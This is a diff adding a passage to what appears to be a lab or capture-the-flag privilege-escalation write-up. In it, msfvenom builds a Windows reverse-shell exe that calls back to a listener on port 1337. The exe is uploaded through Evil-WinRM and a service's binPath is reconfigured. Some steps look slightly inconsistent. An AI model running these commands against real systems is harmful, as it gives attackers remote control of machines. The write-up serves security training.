@@ -922,6 +922,47 @@ Successfully processed 1 files; Failed processing 0 files
 I have the modify permission on an exe.
 
 ```python
-
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.200.88.158 LPORT=1337 -f exe -o shell.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 460 bytes
+Final size of exe file: 7680 bytes
+Saved as: shell.exe
 ```
+
+First ill craft an exe
+
+```python
+penelop -p 1337
+```
+
+Then ill start a listener
+
+```python
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> upload shell.exe
+                                        
+Info: Uploading /home/kali/hsm/CTOS/shell.exe to C:\Program Files\CTOS\InventoryService\shell.exe
+                                        
+Data: 10240 bytes of 10240 bytes copied
+                                        
+Info: Upload successful!
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> dir
+
+
+    Directory: C:\Program Files\CTOS\InventoryService
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----          2/6/2026   8:56 PM          44032 CTOSInventorySvc.exe
+-a----          9/2/2026  12:46 AM              0 shell.exe
+
+
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService> sc.exe config CTOSInventorySvc binPath= "C:\Program Files\CTOS\InventoryService"
+[SC] ChangeServiceConfig SUCCESS
+*Evil-WinRM* PS C:\Program Files\CTOS\InventoryService>
+```
+
+
 
